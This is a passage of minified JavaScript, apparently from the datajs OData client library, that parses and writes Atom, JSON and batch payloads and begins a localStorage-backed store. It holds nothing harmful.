return null;};var applyMetadataToObject=function(entryElement,entryObject,metadata){if(!metadata||metadata.length===0){return;}
var typeName=entryObject.__metadata.type;while(typeName){var entityType=lookupEntityType(typeName,metadata);if(!entityType){return;}
var propertyType;var source=entityType.FC_SourcePath;if(source){propertyType=lookupPropertyType(metadata,entityType,source);applyEntryCustomizationToObject(entityType,source,entryElement,entryObject,propertyType,"");}
var properties=entityType.property;if(properties){var i,len;for(i=0,len=properties.length;i<len;i++){var property=properties[i];var suffixCounter=0;var suffix="";while(property["FC_TargetPath"+suffix]){source=property.name;propertyType=property.type;var sourcePath=property["FC_SourcePath"+suffix];if(sourcePath){source+="/"+sourcePath;propertyType=lookupPropertyType(metadata,entityType,source);}
applyEntryCustomizationToObject(property,source,entryElement,entryObject,propertyType,suffix);suffixCounter++;suffix="_"+suffixCounter;}}}
typeName=entityType.baseType;}};var readAtomEntry=function(atomEntry,metadata){var entryMetadata={};var entry={__metadata:entryMetadata};var etag=xmlAttribute(atomEntry,"etag",odataMetaXmlNs);if(etag){entryMetadata.etag=etag;}
xmlChildElements(atomEntry,function(entryChild){if(entryChild.nsURI===atomXmlNs){switch(entryChild.localName){case"id":entryMetadata.uri=normalizeURI(xmlInnerText(entryChild.domNode),entryChild.baseURI);entryMetadata.uri_extensions=readAtomExtensionAttributes(entryChild);break;case"category":readAtomEntryType(entryChild,entry,entryMetadata);break;case"content":readAtomEntryContent(entryChild,entry);break;case"link":readAtomEntryLink(entryChild,entry,metadata);break;}}
if(entryChild.nsURI===odataMetaXmlNs&&entryChild.localName==="properties"){readAtomEntryStructuralObject(entryChild,entry,entryMetadata);}});applyMetadataToObject(atomEntry,entry,metadata);return entry;};var readAtomEntryType=function(atomCategory,entry,entryMetadata){var scheme=xmlAttribute(atomCategory,"scheme");var term=xmlAttribute(atomCategory,"term");if(scheme===odataScheme){if(entry.__metadata.type){throw{message:"Invalid AtomPub document: multiple category elements defining the entry type were encounterd withing an entry",element:atomCategory};}
entryMetadata.type=term;entryMetadata.type_extensions=[];var typeExtension;xmlAttributes(atomCategory,function(attribute){if(!attribute.nsURI){if(attribute.localName!=="scheme"&&attribute.localName!=="term"){typeExtension=readAtomExtensionAttribute(attribute);entryMetadata.type_extensions.push(typeExtension);}}else if(isExtensionNs(attribute.nsURI)){typeExtension=readAtomExtensionAttribute(attribute);entryMetadata.type_extensions.push(typeExtension);}});}};var readAtomEntryContent=function(atomEntryContent,entry){var src=xmlAttribute(atomEntryContent,"src");var type=xmlAttribute(atomEntryContent,"type");var entryMetadata=entry.__metadata;if(src){if(!type){throw{message:"Invalid AtomPub document: content element must specify the type attribute if the src attribute is also specified",element:atomEntryContent};}
entryMetadata.media_src=normalizeURI(src,atomEntryContent.baseURI);entryMetadata.content_type=type;}
xmlChildElements(atomEntryContent,function(contentChild){if(src){throw{message:"Invalid AtomPub document: content element must not have child elements if the src attribute is specified",element:atomEntryContent};}
if(contentChild.nsURI===odataMetaXmlNs&&contentChild.localName==="properties"){readAtomEntryStructuralObject(contentChild,entry,entryMetadata);}});};var readAtomEntryEditMediaLink=function(link,entry,entryMetadata){entryMetadata.edit_media=link.href;entryMetadata.edit_media_extensions=[];var i,len;for(i=0,len=link.extensions.length;i<len;i++){if(link.extensions[i].namespaceURI===odataMetaXmlNs&&link.extensions[i].name==="etag"){entryMetadata.media_etag=link.extensions[i].value;}else{entryMetadata.edit_media_extensions.push(link.extensions[i]);}}};var readAtomEntryLink=function(atomEntryLink,entry,metadata){var link=readAtomLink(atomEntryLink);var entryMetadata=entry.__metadata;switch(link.rel){case"self":entryMetadata.self=link.href;entryMetadata.self_link_extensions=link.extensions;break;case"edit":entryMetadata.edit=link.href;entryMetadata.edit_link_extensions=link.extensions;break;case"edit-media":readAtomEntryEditMediaLink(link,entry,entryMetadata);break;default:if(link.rel.indexOf(odataRelatedPrefix)===0){readAtomEntryDeferredProperty(atomEntryLink,link,entry,metadata);}
break;}};var readAtomEntryDeferredProperty=function(atomEntryLink,link,entry,metadata){var propertyName=link.rel.substring(odataRelatedPrefix.length);var inlineData=undefined;xmlChildElements(atomEntryLink,function(child){if(child.nsURI===odataMetaXmlNs&&child.localName==="inline"){var inlineRoot=xmlFirstElement(child);if(inlineRoot){inlineData=readAtomDocument(inlineRoot,metadata);}else{inlineData=null;}}});if(inlineData===undefined){inlineData={__deferred:{uri:link.href}};}
entry[propertyName]=inlineData;entry.__metadata.properties=entry.__metadata.properties||{};entry.__metadata.properties[propertyName]={extensions:link.extensions};};var readAtomEntryStructuralObject=function(propertiesElement,parent,parentMetadata){xmlChildElements(propertiesElement,function(property){if(property.nsURI===odataXmlNs){parentMetadata.properties=parentMetadata.properties||{};readAtomEntryProperty(property,parent,parentMetadata.properties);}});};var readAtomEntryProperty=function(property,parent,metadata){var propertyNullValue=null;var propertyTypeValue="Edm.String";var propertyExtensions=[];xmlAttributes(property,function(attribute){if(attribute.nsURI===odataMetaXmlNs){switch(attribute.localName){case"null":propertyNullValue=attribute.domNode.nodeValue;return;case"type":propertyTypeValue=attribute.domNode.nodeValue;return;};}
if(isExtensionNs(attribute.nsURI)){var extension=readAtomExtensionAttribute(attribute);propertyExtensions.push(extension);}});var propertyValue=null;var propertyMetadata={type:propertyTypeValue,extensions:propertyExtensions};if(propertyNullValue!=="true"){propertyValue=xmlInnerText(property.domNode);if(isPrimitiveType(propertyTypeValue)){propertyValue=convertFromAtomPropertyText(propertyValue,propertyTypeValue);}else{if(xmlFirstElement(property)){propertyValue={__metadata:{type:propertyTypeValue}};readAtomEntryStructuralObject(property,propertyValue,propertyMetadata);}}}
parent[property.localName]=propertyValue;metadata[property.localName]=propertyMetadata;};var readAtomServiceDocument=function(atomServiceDoc){var serviceDoc={workspaces:[],extensions:[]};xmlChildElements(atomServiceDoc,function(child){if(child.nsURI===appXmlNs&&child.localName==="workspace"){var workspace=readAtomServiceDocumentWorkspace(child);serviceDoc.workspaces.push(workspace);}else{var serviceExtension=readAtomExtensionElement(atomServiceDoc);serviceDoc.extensions.push(serviceExtension);}});if(serviceDoc.workspaces.length===0){throw{message:"Invalid AtomPub service document: No workspace element found.",element:atomServiceDoc};}
return serviceDoc;};var readAtomServiceDocumentWorkspace=function(atomWorkspace){var workspace={collections:[],extensions:[]};xmlChildElements(atomWorkspace,function(child){if(child.nsURI===atomXmlNs){if(child.localName==="title"){if(atomWorkspace.title){throw{message:"Invalid AtomPub service document: workspace has more than one child title element",element:child};}
workspace.title=xmlInnerText(child.domNode);}}else if(child.nsURI===appXmlNs){if(child.localName==="collection"){var collection=readAtomServiceDocumentCollection(child,workspace);workspace.collections.push(collection);}}else{var extension=readAtomExtensionElement(atomWorkspace);workspace.extensions.push(extension);}});workspace.title=workspace.title||"";return workspace;};var readAtomServiceDocumentCollection=function(atomCollection){var collection={href:xmlAttribute(atomCollection,"href"),extensions:[]};if(!collection.href){throw{message:"Invalid AtomPub service document: collection has no href attribute",element:atomCollection};}
collection.href=normalizeURI(collection.href,atomCollection.baseURI);xmlChildElements(atomCollection,function(child){if(child.nsURI===atomXmlNs){if(child.localName==="title"){if(collection.title){throw{message:"Invalid AtomPub service document: collection has more than one child title element",element:child};}
collection.title=xmlInnerText(child.domNode);}}else if(child.nsURI!==appXmlNs){var extension=readAtomExtensionElement(atomCollection);collection.extensions.push(extension);}});if(!collection.title){throw{message:"Invalid AtomPub service document: collection has no title element",element:atomCollection};}
return collection;};var writeAtomDocument=function(data,context){var docRoot;var type=payloadTypeOf(data);switch(type){case PAYLOADTYPE_FEEDORLINKS:docRoot=writeAtomFeed(null,data,context);break;case PAYLOADTYPE_ENTRY:case PAYLOADTYPE_COMPLEXTYPE:docRoot=writeAtomEntry(null,data,context);break;}
return docRoot;};var writeAtomRoot=function(parent,name){if(parent){return xmlNewElement(parent,name,atomXmlNs);}
var result=xmlNewDocument(name,atomXmlNs);xmlAddNamespaceAttribute(result.domNode,"xmlns:d",odataXmlNs);xmlAddNamespaceAttribute(result.domNode,"xmlns:m",odataMetaXmlNs);return result;};var writeAtomFeed=function(parent,data,context){var feed=writeAtomRoot(parent,"feed");var entries=(isArray(data))?data:data.results;if(entries){var i,len;for(i=0,len=entries.length;i<len;i++){writeAtomEntry(feed,entries[i],context);}}
return feed;};var writeAtomEntry=function(parent,data,context){var entry=writeAtomRoot(parent,"entry");var author=xmlNewElement(entry,"author",atomXmlNs);xmlNewElement(author,"name",atomXmlNs);xmlNewElement(entry,"title",atomXmlNs);var content=xmlNewElement(entry,"content",atomXmlNs);xmlNewAttribute(content,"type",null,"application/xml");var properties=xmlNewElement(content,propertiesTag,odataMetaXmlNs);var propertiesMetadata=(data.__metadata)?data.__metadata.properties:null;writeAtomEntryMetadata(entry,data.__metadata);writeAtomEntryProperties(entry,properties,data,propertiesMetadata,context);applyMetadataToEntry(entry,data,context);return entry;};var applyMetadataToEntry=function(entry,data,context){if(!data.__metadata){return;}
var metadata=context.metadata;var entityType=lookupEntityType(data.__metadata.type,metadata);while(entityType){var propertyType;var source=entityType.FC_SourcePath;if(source){propertyType=lookupPropertyType(metadata,entityType,source);applyEntryCustomizationToEntry(entityType,source,entry,data,propertyType,"",context);}
var properties=entityType.property;if(properties){var i,len;for(i=0,len=properties.length;i<len;i++){var property=properties[i];var suffixCounter=0;var suffix="";while(property["FC_TargetPath"+suffix]){source=property.name;if(property["FC_SourcePath"+suffix]){source+="/"+property["FC_SourcePath"+suffix];}
applyEntryCustomizationToEntry(property,source,entry,data,property.type,suffix,context);suffixCounter++;suffix="_"+suffixCounter;}}}
entityType=lookupEntityType(entityType.baseType,metadata);}};var writeAtomEntryMetadata=function(entry,metadata){if(metadata){if(metadata.etag){xmlNewAttribute(entry,"etag",odataMetaXmlNs,metadata.etag);}
if(metadata.uri){xmlNewElement(entry,"id",atomXmlNs,metadata.uri);}
if(metadata.type){var category=xmlNewElement(entry,"category",atomXmlNs);xmlNewAttribute(category,"term",null,metadata.type);xmlNewAttribute(category,"scheme",null,odataScheme);}}};var writeAtomEntryLink=function(entry,href,rel){var link=xmlNewElement(entry,"link",atomXmlNs);xmlNewAttribute(link,"rel",null,rel);xmlNewAttribute(link,"href",null,href);return link;};var writeAtomEntryProperties=function(entry,parentElement,data,propertiesMetadata,context){var name,value,kind,propertyMetadata;var contextMetadata=context.metadata;var dataMetadataType;for(name in data){if(name!=="__metadata"){value=data[name];kind=propertyKindOf(value);propertyMetadata=(propertiesMetadata)?propertiesMetadata[name]:null;if(!propertyMetadata){if(dataMetadataType===undefined){if(data.__metadata){dataMetadataType=lookupEntityType(data.__metadata.type,contextMetadata);}}
if(dataMetadataType){propertyMetadata=lookupProperty(dataMetadataType.property,name);if(!propertyMetadata){propertyMetadata=lookupProperty(dataMetadataType.navigationProperty,name);}}}
if(kind===PROPERTYKIND_NONE){kind=PROPERTYKIND_PRIMITIVE;if(propertyMetadata&&!isPrimitiveType(propertyMetadata.type)){if(propertyMetadata.relationship){kind=PROPERTYKIND_INLINE;}else if(lookupComplexType(propertyMetadata.type,context.metadata)){kind=PROPERTYKIND_COMPLEX;}}}
if(kind===PROPERTYKIND_PRIMITIVE||kind===PROPERTYKIND_COMPLEX){writeAtomEntryProperty(parentElement,name,kind,value,propertyMetadata,context);}else{writeAtomEntryDeferredProperty(entry,kind,name,value,context);}}}};var writeAtomEntryProperty=function(parentElement,name,kind,value,propertiesMetadata,context){var propertyTagName=xmlQualifyXmlTagName(name,"d");var propertyType=propertiesMetadata&&propertiesMetadata.type;var property;if(kind===PROPERTYKIND_COMPLEX){property=xmlNewElement(parentElement,propertyTagName,odataXmlNs);var propertyMetadata;if(propertiesMetadata){propertyMetadata=propertiesMetadata.properties;}
if(value===null){context.dataServiceVersion="2.0";}
writeAtomEntryProperties(null,property,value,propertyMetadata,context);}else{property=xmlNewElement(parentElement,propertyTagName,odataXmlNs,convertToAtomPropertyText(value,propertyType||"Edm.String"));}
if(value===null){xmlNewAttribute(property,propertyNullAttribute,odataMetaXmlNs,"true");}
if(propertyType){xmlNewAttribute(property,propertyTypeAttribute,odataMetaXmlNs,propertyType);}};var writeAtomEntryDeferredProperty=function(entry,kind,name,value,context){var href;var inlineWriter;var inlineType;var inlineContent=kind===PROPERTYKIND_INLINE;if(inlineContent){href=(value&&value.__metadata)?value.__metadata.uri:"";inlineType=payloadTypeOf(value);switch(inlineType){case PAYLOADTYPE_ENTRY:inlineWriter=writeAtomEntry;break;case PAYLOADTYPE_FEEDORLINKS:inlineType="feed";inlineWriter=writeAtomFeed;break;case PAYLOADTYPE_NONE:inlineType=PAYLOADTYPE_ENTRY;inlineWriter=null;break;default:throw{message:"Invalid payload for inline navigation property: "+inlineType};}}else{href=value.__deferred.uri;}
var rel=normalizeURI(name,odataRelatedPrefix);var link=writeAtomEntryLink(entry,href,rel);if(inlineContent){var inlineRoot=xmlNewElement(link,inlineTag,odataMetaXmlNs);xmlNewAttribute(link,"type",null,"application/atom+xml;type="+inlineType);if(inlineWriter){inlineWriter(inlineRoot,value,context);}}};var atomParser=function(handler,text,context){if(text){var atomRoot=xmlParse(text);if(atomRoot){return readAtomDocument(atomRoot,context.metadata);}}};var atomSerializer=function(handler,data,context){var cType=context.contentType=context.contentType||contentType(atomMediaType);var result=undefined;if(cType&&cType.mediaType===atomMediaType){var atomDoc=writeAtomDocument(data,context);result=xmlSerialize(atomDoc);}
return result;};odata.atomHandler=handler(atomParser,atomSerializer,atomAcceptTypes.join(","),MAX_DATA_SERVICE_VERSION);var schema={elements:{Association:{attributes:["Name"],elements:["End*","ReferentialConstraint"]},AssociationSet:{attributes:["Name","Association"],elements:["End*"]},CollectionType:{attributes:["ElementType","Nullable","DefaultValue","MaxLength","FixedLength","Precision","Scale","Unicode","Collation"]},ComplexType:{attributes:["Name","BaseType","Abstract"],elements:["Property*"]},DefiningExpression:{text:true},Dependent:{attributes:["Role"],elements:["PropertyRef*"]},Documentation:{text:true},End:{attributes:["Type","Role","Multiplicity","EntitySet"],elements:["OnDelete"]},EntityContainer:{attributes:["Name","Extends"],elements:["EntitySet*","AssociationSet*","FunctionImport*"]},EntitySet:{attributes:["Name","EntityType"]},EntityType:{attributes:["Name","BaseType","Abstract","OpenType"],elements:["Key","Property*","NavigationProperty*"]},Function:{attributes:["Name","ReturnType"],elements:["Parameter*","DefiningExpression","ReturnType"]},FunctionImport:{attributes:["Name","ReturnType","EntitySet"],elements:["Parameter*"]},Key:{elements:["PropertyRef*"]},NavigationProperty:{attributes:["Name","Relationship","ToRole","FromRole"]},OnDelete:{attributes:["Action"]},Parameter:{attributes:["Name","Type","Mode","MaxLength","Precision","Scale"]},Principal:{attributes:["Role"],elements:["PropertyRef*"]},Property:{attributes:["Name","Type","Nullable","DefaultValue","MaxLength","FixedLength","Precision","Scale","Unicode","Collation","ConcurrencyMode"]},PropertyRef:{attributes:["Name"]},ReferenceType:{attributes:["Type"]},ReferentialConstraint:{elements:["Principal","Dependent"]},ReturnType:{attributes:["ReturnType"],elements:["CollectionType","ReferenceType","RowType"]},RowType:{elements:["Property*"]},Schema:{attributes:["Namespace","Alias"],elements:["Using*","EntityContainer*","EntityType*","Association*","ComplexType*","Function*"]},TypeRef:{attributes:["Type","Nullable","DefaultValue","MaxLength","FixedLength","Precision","Scale","Unicode","Collation"]},Using:{attributes:["Namespace","Alias"]}}};var customizationAttributes=["m:FC_ContentKind","m:FC_KeepInContent","m:FC_NsPrefix","m:FC_NsUri","m:FC_SourcePath","m:FC_TargetPath"];schema.elements.Property.attributes=schema.elements.Property.attributes.concat(customizationAttributes);schema.elements.EntityType.attributes=schema.elements.EntityType.attributes.concat(customizationAttributes);schema.elements.Edmx={attributes:["Version"],elements:["DataServices"],ns:edmxNs};schema.elements.DataServices={elements:["Schema*"],ns:edmxNs};schema.elements.EntityContainer.attributes.push("m:IsDefaultEntityContainer");schema.elements.Property.attributes.push("m:MimeType");schema.elements.FunctionImport.attributes.push("m:HttpMethod");schema.elements.EntityType.attributes.push("m:HasStream");schema.elements.DataServices.attributes=["m:DataServiceVersion","m:MaxDataServiceVersion"];var scriptCase=function(text){if(!text){return text;}
if(text.length>1){var firstTwo=text.substr(0,2);if(firstTwo===firstTwo.toUpperCase()){return text;}
return text.charAt(0).toLowerCase()+text.substr(1);}
return text.charAt(0).toLowerCase();};var getChildSchema=function(parentSchema,candidateName){if(candidateName==="Documentation"){return{isArray:true,propertyName:"documentation"};}
var elements=parentSchema.elements;if(!elements){return null;}
var i,len;for(i=0,len=elements.length;i<len;i++){var elementName=elements[i];var multipleElements=false;if(elementName.charAt(elementName.length-1)==="*"){multipleElements=true;elementName=elementName.substr(0,elementName.length-1);}
if(candidateName===elementName){var propertyName=scriptCase(elementName);return{isArray:multipleElements,propertyName:propertyName};}}
return null;};var isFeedCustomizationNameRE=/^(m:FC_.*)_[0-9]+$/;var isEdmNamespace=function(nsURI){return nsURI===edmNs||nsURI===edmNs2||nsURI===edmNs3||nsURI===edmNs4;};var parseConceptualModelElement=function(element){if(!element.domNode){element=xml_wrapNode(element,"");}
var localName=element.localName;var elementSchema=schema.elements[localName];if(!elementSchema){return null;}
if(elementSchema.ns){if(element.nsURI!==elementSchema.ns){return null;}}else if(!isEdmNamespace(element.nsURI)){return null;}
var item={};var extensions=[];var attributes=elementSchema.attributes||[];xmlAttributes(element,function(wrappedAttribute){var node=wrappedAttribute.domNode;var localName=wrappedAttribute.localName;var namespaceURI=wrappedAttribute.nsURI;var value=node.value;if(namespaceURI===xmlnsNS){return;}
var schemaName=null;var handled=false;if(isEdmNamespace(namespaceURI)||namespaceURI===null){schemaName="";}else if(namespaceURI===odataMetaXmlNs){schemaName="m:";}
if(schemaName!==null){schemaName+=localName;var match=isFeedCustomizationNameRE.exec(schemaName);if(match){schemaName=match[1];}
if(contains(attributes,schemaName)){handled=true;item[scriptCase(localName)]=value;}}
if(!handled){extensions.push(createAttributeExtension(wrappedAttribute));}});xmlChildElements(element,function(child){var childSchema=getChildSchema(elementSchema,child.localName);if(childSchema){if(childSchema.isArray){var arr=item[childSchema.propertyName];if(!arr){arr=[];item[childSchema.propertyName]=arr;}
arr.push(parseConceptualModelElement(child));}else{item[childSchema.propertyName]=parseConceptualModelElement(child);}}else{extensions.push(createElementExtension(child));}});if(elementSchema.text){item.text=xmlInnerText(element);}
if(extensions.length){item.extensions=extensions;}
return item;};var metadataParser=function(handler,text){var doc=xmlParse(text);return parseConceptualModelElement(doc)||undefined;};odata.metadataHandler=handler(metadataParser,null,xmlMediaType,MAX_DATA_SERVICE_VERSION);var jsonAcceptTypes=["application/json","application/json;odata=verbose"];var jsonMediaType=contentType(jsonAcceptTypes[0]);var jsonVerboseMediaType=contentType(jsonAcceptTypes[1]);var normalizeServiceDocument=function(data,baseURI){var workspace={collections:[]};var i,len;for(i=0,len=data.EntitySets.length;i<len;i++){var title=data.EntitySets[i];var collection={title:title,href:normalizeURI(title,baseURI)};workspace.collections.push(collection);}
return{workspaces:[workspace]};};var jsonDateRE=/^\/Date\((-?\d+)(\+|-)?(\d+)?\)\/$/;var minutesToOffset=function(minutes){var sign;if(minutes<0){sign="-";minutes=-minutes;}else{sign="+";}
var hours=Math.floor(minutes/60);minutes=minutes-(60*hours);return sign+formatNumberWidth(hours,2)+":"+formatNumberWidth(minutes,2);};var parseJsonDateString=function(value){var arr=value&&jsonDateRE.exec(value);if(arr){var result=new Date(parseInt10(arr[1]));if(arr[2]){var mins=parseInt10(arr[3]);if(arr[2]==="-"){mins=-mins;}
var current=result.getUTCMinutes();result.setUTCMinutes(current-mins);result.__edmType="Edm.DateTimeOffset";result.__offset=minutesToOffset(mins);}
if(!isNaN(result.valueOf())){return result;}}};var traverseInternal=function(item,callback){if(item&&typeof item==="object"){for(var name in item){var value=item[name];var result=traverseInternal(value,callback);result=callback(name,result);if(result!==value){if(value===undefined){delete item[name];}else{item[name]=result;}}}}
return item;};var traverse=function(item,callback){return callback("",traverseInternal(item,callback));};var jsonParser=function(handler,text,context){var metadata=context.metadata;var recognizeDates=defined(context.context?context.context.recognizeDates:undefined,handler.recognizeDates);var json=(typeof text==="string")?window.JSON.parse(text):text;json=traverse(json,function(_,value){if(value&&typeof value==="object"){var dataTypeName=value.__metadata&&value.__metadata.type;var dataType=lookupEntityType(dataTypeName,metadata)||lookupComplexType(dataTypeName,metadata);if(dataType){var properties=dataType.property;if(properties){var i,len;for(i=0,len=properties.length;i<len;i++){var property=properties[i];var propertyName=property.name;var propertyValue=value[propertyName];if(property.type==="Edm.DateTime"||property.type==="Edm.DateTimeOffset"){if(propertyValue){propertyValue=parseJsonDateString(propertyValue);if(!propertyValue){throw{message:"Invalid date/time value"};}
value[propertyName]=propertyValue;}}else if(property.type==="Edm.Time"){value[propertyName]=parseDuration(propertyValue);}}}}else if(recognizeDates){for(var name in value){propertyValue=value[name];if(typeof propertyValue==="string"){value[name]=parseJsonDateString(propertyValue)||propertyValue;}}}}
return value;}).d;json=jsonUpdateDataFromVersion(json,context.dataServiceVersion);json=jsonNormalizeData(json,context.response.requestUri);return json;};var jsonSerializer=function(handler,data,context){var result=undefined;var cType=context.contentType=context.contentType||jsonVerboseMediaType;if(cType&&cType.mediaType===jsonMediaType.mediaType){var json=data;var dateToJSON=Date.prototype.toJSON;try{Date.prototype.toJSON=function(){return formatDateTimeOffset(this);};result=window.JSON.stringify(json,jsonReplacer);}finally{Date.prototype.toJSON=dateToJSON;}}
return result;};var jsonReplacer=function(_,value){if(value&&value.__edmType==="Edm.Time"){return formatDuration(value);}else{return value;}};var jsonNormalizeData=function(data,baseURI){if(payloadTypeOf(data)===PAYLOADTYPE_SVCDOC){return normalizeServiceDocument(data,baseURI);}else{return data;}};var jsonUpdateDataFromVersion=function(data,dataVersion){if(dataVersion&&dataVersion.lastIndexOf(";")===dataVersion.length-1){dataVersion=dataVersion.substr(0,dataVersion.length-1);}
if(!dataVersion){if(isArray(data)){dataVersion="1.0";}}
if(dataVersion==="1.0"){if(isArray(data)){data={results:data};}}
return data;};odata.jsonHandler=handler(jsonParser,jsonSerializer,jsonAcceptTypes.join(","),MAX_DATA_SERVICE_VERSION);odata.jsonHandler.recognizeDates=false;var batchMediaType="multipart/mixed";var responseStatusRegex=/^HTTP\/1\.\d (\d{3}) (.*)$/i;var responseHeaderRegex=/^([^()<>@,;:\\"\/[\]?={} \t]+)\s?:\s?(.*)/;var hex16=function(){return Math.floor((1+Math.random())*0x10000).toString(16).substr(1);};var createBoundary=function(prefix){return prefix+hex16()+"-"+hex16()+"-"+hex16();};var partHandler=function(context){return context.handler.partHandler;};var currentBoundary=function(context){var boundaries=context.boundaries;return boundaries[boundaries.length-1];};var batchParser=function(handler,text,context){var boundary=context.contentType.properties["boundary"];return{__batchResponses:readBatch(text,{boundaries:[boundary],handlerContext:context})};};var batchSerializer=function(handler,data,context){var cType=context.contentType=context.contentType||contentType(batchMediaType);if(cType.mediaType===batchMediaType){return writeBatch(data,context);}};var readBatch=function(text,context){var delimiter="--"+currentBoundary(context);readTo(text,context,delimiter);readLine(text,context);var responses=[];var partEnd;while(partEnd!=="--"&&context.position<text.length){var partHeaders=readHeaders(text,context);var partContentType=contentType(partHeaders["Content-Type"]);if(partContentType&&partContentType.mediaType===batchMediaType){context.boundaries.push(partContentType.properties["boundary"]);try{var changeResponses=readBatch(text,context);}catch(e){e.response=readResponse(text,context,delimiter);changeResponses=[e];}
responses.push({__changeResponses:changeResponses});context.boundaries.pop();readTo(text,context,"--"+currentBoundary(context));}else{if(!partContentType||partContentType.mediaType!=="application/http"){throw{message:"invalid MIME part type "};}
readLine(text,context);var response=readResponse(text,context,delimiter);try{if(response.statusCode>=200&&response.statusCode<=299){partHandler(context.handlerContext).read(response,context.handlerContext);}else{response={message:"HTTP request failed",response:response};}}catch(e){response=e;}
responses.push(response);}
partEnd=text.substr(context.position,2);readLine(text,context);}
return responses;};var readHeaders=function(text,context){var headers={};var parts;var line;var pos;do{pos=context.position;line=readLine(text,context);parts=responseHeaderRegex.exec(line);if(parts!==null){headers[parts[1]]=parts[2];}else{context.position=pos;}}while(line&&parts);normalizeHeaders(headers);return headers;};var readResponse=function(text,context,delimiter){var pos=context.position;var match=responseStatusRegex.exec(readLine(text,context));var statusCode;var statusText;var headers;if(match){statusCode=match[1];statusText=match[2];headers=readHeaders(text,context);readLine(text,context);}else{context.position=pos;}
return{statusCode:statusCode,statusText:statusText,headers:headers,body:readTo(text,context,"\r\n"+delimiter)};};var readLine=function(text,context){return readTo(text,context,"\r\n");};var readTo=function(text,context,str){var start=context.position||0;var end=text.length;if(str){end=text.indexOf(str,start);if(end===-1){return null;}
context.position=end+str.length;}else{context.position=end;}
return text.substring(start,end);};var writeBatch=function(data,context){var type=payloadTypeOf(data);if(type!==PAYLOADTYPE_BATCH){throw{message:"Serialization of batches of type \""+type+"\" is not supported"};}
var batchBoundary=createBoundary("batch_");var batchParts=data.__batchRequests;var batch="";var i,len;for(i=0,len=batchParts.length;i<len;i++){batch+=writeBatchPartDelimiter(batchBoundary,false)+
writeBatchPart(batchParts[i],context);}
batch+=writeBatchPartDelimiter(batchBoundary,true);var contentTypeProperties=context.contentType.properties;contentTypeProperties.boundary=batchBoundary;return batch;};var writeBatchPartDelimiter=function(boundary,close){var result="\r\n--"+boundary;if(close){result+="--";}
return result+"\r\n";};var writeBatchPart=function(part,context,nested){var changeSet=part.__changeRequests;var result;if(isArray(changeSet)){if(nested){throw{message:"Not Supported: change set nested in other change set"};}
var changeSetBoundary=createBoundary("changeset_");result="Content-Type: "+batchMediaType+"; boundary="+changeSetBoundary+"\r\n";var i,len;for(i=0,len=changeSet.length;i<len;i++){result+=writeBatchPartDelimiter(changeSetBoundary,false)+
writeBatchPart(changeSet[i],context,true);}
result+=writeBatchPartDelimiter(changeSetBoundary,true);}else{result="Content-Type: application/http\r\nContent-Transfer-Encoding: binary\r\n\r\n";prepareRequest(part,partHandler(context),{metadata:context.metadata});result+=writeRequest(part);}
return result;};var writeRequest=function(request){var result=(request.method?request.method:"GET")+" "+request.requestUri+" HTTP/1.1\r\n";for(var name in request.headers){if(request.headers[name]){result=result+name+": "+request.headers[name]+"\r\n";}}
result+="\r\n";if(request.body){result+=request.body;}
return result;};odata.batchHandler=handler(batchParser,batchSerializer,batchMediaType,MAX_DATA_SERVICE_VERSION);var handlers=[odata.jsonHandler,odata.atomHandler,odata.xmlHandler,odata.textHandler];var dispatchHandler=function(handlerMethod,requestOrResponse,context){var i,len;for(i=0,len=handlers.length;i<len&&!handlers[i][handlerMethod](requestOrResponse,context);i++){}
if(i===len){throw{message:"no handler for data"};}};odata.defaultSuccess=function(data){window.alert(window.JSON.stringify(data));};odata.defaultError=throwErrorCallback;odata.defaultHandler={read:function(response,context){if(response&&assigned(response.body)&&response.headers["Content-Type"]){dispatchHandler("read",response,context);}},write:function(request,context){dispatchHandler("write",request,context);},maxDataServiceVersion:MAX_DATA_SERVICE_VERSION,accept:"application/atomsvc+xml;q=0.8, application/json;odata=verbose;q=0.5, */*;q=0.1"};odata.defaultMetadata=[];odata.read=function(urlOrRequest,success,error,handler,httpClient,metadata){var request;if(urlOrRequest instanceof String||typeof urlOrRequest==="string"){request={requestUri:urlOrRequest};}else{request=urlOrRequest;}
return odata.request(request,success,error,handler,httpClient,metadata);};odata.request=function(request,success,error,handler,httpClient,metadata){if(!success){success=odata.defaultSuccess;}
if(!error){error=odata.defaultError;}
if(!handler){handler=odata.defaultHandler;}
if(!httpClient){httpClient=odata.defaultHttpClient;}
if(!metadata){metadata=odata.defaultMetadata;}
request.recognizeDates=defined(request.recognizeDates,odata.jsonHandler.recognizeDates);request.callbackParameterName=defined(request.callbackParameterName,odata.defaultHttpClient.callbackParameterName);request.formatQueryString=defined(request.formatQueryString,odata.defaultHttpClient.formatQueryString);request.enableJsonpCallback=defined(request.enableJsonpCallback,odata.defaultHttpClient.enableJsonpCallback);var context={metadata:metadata,recognizeDates:request.recognizeDates,callbackParameterName:request.callbackParameterName,formatQueryString:request.formatQueryString,enableJsonpCallback:request.enableJsonpCallback};try{prepareRequest(request,handler,context);return invokeRequest(request,success,error,handler,httpClient,context);}catch(err){error(err);}};odata.batchHandler.partHandler=odata.defaultHandler;var localStorage=window.localStorage;var domStoreDateToJSON=function(){var newValue={v:this.valueOf(),t:"[object Date]"};for(var name in this){newValue[name]=this[name];}
return newValue;};var domStoreJSONToDate=function(_,value){if(value&&value.t==="[object Date]"){var newValue=new Date(value.v);for(var name in value){if(name!=="t"&&name!=="v"){newValue[name]=value[name];}}
value=newValue;}
return value;};var qualifyDomStoreKey=function(store,key){return store.name+"#!#"+key;};var unqualifyDomStoreKey=function(store,key){return key.replace(store.name+"#!#","");};var DomStore=function(name){this.name=name;};DomStore.create=function(name){if(DomStore.isSupported()){return new DomStore(name);}
throw{message:"Web Storage not supported by the browser"};};DomStore.isSupported=function(){return!!localStorage;};DomStore.prototype.add=function(key,value,success,error){error=error||this.defaultError;var store=this;this.contains(key,function(contained){if(!contained){store.addOrUpdate(key,value,success,error);}else{delay(error,{message:"key already exists",key:key});}},error);};DomStore.prototype.addOrUpdate=function(key,value,success,error){error=error||this.defaultError;if(key instanceof Array){error({message:"Array of keys not supported"});}else{var fullKey=qualifyDomStoreKey(this,key);var oldDateToJSON=Date.prototype.toJSON;try{var storedValue=value;if(storedValue!==undefined){Date.prototype.toJSON=domStoreDateToJSON;storedValue=window.JSON.stringify(value);}
localStorage.setItem(fullKey,storedValue);delay(success,key,value);}
catch(e){if(e.code===22||e.number===0x8007000E){delay(error,{name:"QUOTA_EXCEEDED_ERR",error:e});}else{delay(error,e);}}
